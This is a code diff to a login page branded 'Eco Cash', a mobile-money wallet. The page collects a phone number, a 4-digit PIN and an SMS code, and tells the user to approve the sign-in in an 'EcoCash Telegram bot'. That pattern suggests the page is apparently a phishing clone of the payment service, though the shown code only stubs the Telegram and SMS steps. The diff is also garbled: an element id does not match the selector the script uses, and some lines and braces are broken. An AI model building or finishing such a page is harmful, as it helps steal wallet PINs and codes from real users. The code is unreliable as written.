@@ -371,13 +371,18 @@ a:focus-visible {
       </div>
     </div>
 
+    <div class="step" data-step="signing" hidden>
+      <div class="spinner" aria-hidden="true"></div>
       <h1>Signing you in...</h1>
-     
+      <p class="subtle">Checking your phone number and PIN</p>
+    </div>
+
     <div class="step" data-step="approval" hidden>
       <div class="spinner" aria-hidden="true"></div>
       <h1>Waiting for approval</h1>
       <p class="subtle">
-        Approve this sign-in for <strong id="approval-phone">
+        Approve this sign-in for <strong id="approval-telegram bot"></strong> in the EcoCash Telegram bot.
+      </p>
     </div>
 
     <div class="step" data-step="otp" hidden>
@@ -398,7 +403,35 @@ a:focus-visible {
     </div>
   </section>
 
- 
+  <section class="bottom">
+    <div class="step" data-step="login">
+      <p class="prompt">To register for a wallet or get assistance, click below</p>
+      <button type="button" class="btn-primary" id="login-button">Log in</button>
+      <div class="actions">
+        <button type="button" id="register">
+          <span class="symbol">♟</span>Register
+        </button>
+        <button type="button" id="help">
+          <span class="symbol">ⓘ</span>Help &amp; Support
+        </button>
+      </div>
+      <p class="version">Eco Cash</p>
+      <p class="terms">
+        By continuing, you agree to the
+        <a href="#" id="terms">Terms and Conditions</a>
+      </p>
+    </div>
+
+    <div class="step" data-step="signing" hidden>
+      <p class="prompt">This usually takes a few seconds.</p>
+    </div>
+
+      <div class="step" data-step="approval" hidden>
+      <p class="prompt">
+        Signing in...
+      </p>
+    </div>
+
     <div class="step" data-step="otp" hidden>
       <p class="prompt">Didn't get the code? You can request a new one shortly.</p>
       <button type="button" class="btn-primary" id="resend" disabled>Resend code in 30s</button>
@@ -414,6 +447,7 @@ const $ = (selector) => document.querySelector(selector);
 
 const phoneInput = $('#phone');
 const pinInputs = [...document.querySelectorAll('.pin input')];
+const notice = $('#notice');
 const otpInput = $('#otp-input');
 const otpBoxes = [...document.querySelectorAll('.otp-box')];
 const resendButton = $('#resend');
@@ -452,17 +486,20 @@ pinInputs.forEach((input, index) => {
 
 function isLoginReady() {
   return (
-    /^\d{9}$/.test(digitsOnly(phoneInput.value, 20)) &&
+    /^\d{9,15}$/.test(digitsOnly(phoneInput.value, 20)) &&
     pinInputs.every((input) => input.value.length === 1)
   );
 }
 
-
+$('#login-button').onclick = () => {
+  if (!isLoginReady()) {
     notice.textContent = 'Enter your phone number and 4-digit PIN to continue.';
     return;
   }
-  phoneNumber = digitsOnly(phoneInput.value, 9);
-  showStep('signing in.....');
+  phoneNumber = digitsOnly(phoneInput.value, 20);
+  showStep('signing');
+  window.setTimeout(showApproval, 1500);
+};
 
 function showApproval() {
   $('#approval-phone').textContent = '+263 ' + phoneNumber;
@@ -471,11 +508,18 @@ function showApproval() {
 }
 
 function waitForTelegramApproval() {
-  // Demo stand-in: resolves when the approve button is tapped on telegram bot.
+  // Demo stand-in: resolves when the approve button is tapped. Replace with a check of the Telegram bot's approval status.
   return new Promise((resolve) => {
     approvalResolve = resolve;
   });
+}
 
+$('#approve-demo').onclick = () => {
+  if (approvalResolve) {
+    approvalResolve();
+    approvalResolve = null;
+  }
+};
 
 $('#cancel-approval').onclick = () => {
   approvalResolve = null;
@@ -551,6 +595,12 @@ function stopResendCountdown() {
   window.clearInterval(resendInterval);
   resendInterval = null;
 }
+
+resendButton.onclick = () => {
+  setOtpValue('');
+  startResendCountdown();
+  notice.textContent = 'Connect your SMS provider to send a new code.';
+};
 
 $('#change-number').onclick = () => {
   stopResendCountdown();
